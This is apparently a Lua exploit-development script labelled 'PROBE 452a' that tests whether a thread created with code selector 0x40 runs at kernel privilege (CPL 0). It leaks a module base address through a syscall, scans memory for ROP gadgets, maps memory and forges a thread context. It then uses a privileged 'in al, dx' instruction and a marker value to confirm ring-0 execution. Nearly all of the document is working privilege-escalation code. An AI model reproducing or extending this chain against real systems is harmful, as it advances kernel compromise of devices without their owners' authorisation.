-- CRASH_CLASS: HIGH
-- PROBE 452a: is the CS=0x40 thread running at ring 0?
--
-- 448a proved a child with CS = 0x40 executes a user gadget with no panic.
-- That is either "selector replaced, still ring 3" or "ring 0".
--
-- `in al, dx` (EC) is illegal at CPL 3 and legal at CPL 0, changes no CPU
-- state and cannot mask interrupts. Gadget: EC C3 = in al, dx; ret.
-- DX is set to 0x80, a harmless port.
--
-- Chain for the child:
--   RIP = in al,dx; ret
--   stack: [write_gadget] [park]
-- If the marker holds MAGIC the privileged instruction executed, which
-- only happens at CPL 0. A #GP at CPL 3 leaves the marker untouched.

print("=== PROBE 452a: RING TEST VIA IN ===")
print("")
local Z = uint64(0)
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(sc, ...)
    local ok, rv = pcall(function(...) return sc(...) end, ...)
    if ok then return to_num(rv) end
    return -999
end
local function rd32(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end return -1 end
local function rd64r(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end return nil end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(v) return string.format("0x%X", v) end

local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local base, size = 0, 0
if call(make_syscall(593), Z, info) == 0 then
    local lo, hi = rd32(info + 0x108), rd32(info + 0x10C)
    if lo and hi and lo >= 0 and hi >= 0 then base = hi * 4294967296 + lo end
    size = rd32(info + 0x110)
end
if base == 0 or size <= 0 then print("  no base"); return end

local buf = nil
pcall(function() buf = memory.read_buffer(base, size) end)
if type(buf) ~= "string" then print("  read failed"); return end

-- first `EC C3` is the gadget we enter
local ING = 0
for i = 1, #buf - 1 do
    if string.byte(buf, i) == 0xEC and string.byte(buf, i + 1) == 0xC3 then
        ING = base + (i - 1); break
    end
end
-- write gadget `48 89 07 C3` and park `EB FE`
local GDP, PARK = 0, 0
for i = 1, #buf - 3 do
    if string.byte(buf, i) == 0x48 and string.byte(buf, i + 1) == 0x89
       and string.byte(buf, i + 2) == 0x07 and string.byte(buf, i + 3) == 0xC3 and GDP == 0 then
        GDP = base + (i - 1)
    end
    if string.byte(buf, i) == 0xEB and string.byte(buf, i + 1) == 0xFE and PARK == 0 then
        PARK = base + (i - 1)
    end
    if GDP ~= 0 and PARK ~= 0 then break end
end
print(string.format("  in-gadget=%s write=%s park=%s", fmt(ING), fmt(GDP), fmt(PARK)))
if ING == 0 or GDP == 0 or PARK == 0 then print("  gadget missing"); return end

local MAGIC_HI, MAGIC_LO = 0x1234, 0x567890AB
local marker = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
local out = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
local stack = call(make_syscall(477), Z, uint64(0x200000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
if marker < 0 or out < 0 or stack < 0 then print("  mmap failed"); return end
wd(marker, 0x5A5A); wq(marker, Z); wq(out, Z)

local ctx = memory.alloc(0x500)
local i = 0
while i < 0x500 do wq(ctx + i, Z); i = i + 8 end
wd(ctx + 0x0d0, 0)
wq(ctx + 0x108, u64(0, 0x480))
wq(ctx + 0x110, u64(0, 0x10000))
wq(ctx + 0x0c0, u64(0, 0x40))      -- the experiment: RPL 0
wq(ctx + 0x100, u64(0, 0x3b))
wq(ctx + 0x0f0, u64(0, 0x202))
wq(ctx + 0x0e0, u64(0, ING))       -- first instruction: in al, dx
wq(ctx + 0x048, u64(0, marker))   -- rdi
wq(ctx + 0x058, u64(0, 0x80))     -- rdx: I/O port 0x80
wq(ctx + 0x078, u64(MAGIC_HI, MAGIC_LO)) -- rax
local sp = stack + 0x100000
wq(ctx + 0x0f8, u64(0, sp))
wq(sp, u64(0, GDP))
wq(sp + 8, u64(0, PARK))

print("  RIP -> in al,dx ; ret")
local rv = call(make_syscall(430), ctx, out, Z, Z, Z, Z)
local tid = rd64r(out)
print(string.format("  thr_create rv=%d tid=%s", rv, tid and fmt(to_num(tid)) or "nil"))
local x = 0
while x < 2000000 do x = x + 1 end
local m = rd32(marker)
print(string.format("  marker=0x%X  %s", m or 0,
    (m == MAGIC_LO) and "EXECUTED AT CPL 0" or "not written (illegal at CPL 3)"))
print("")
print("=== 452a DONE ===")
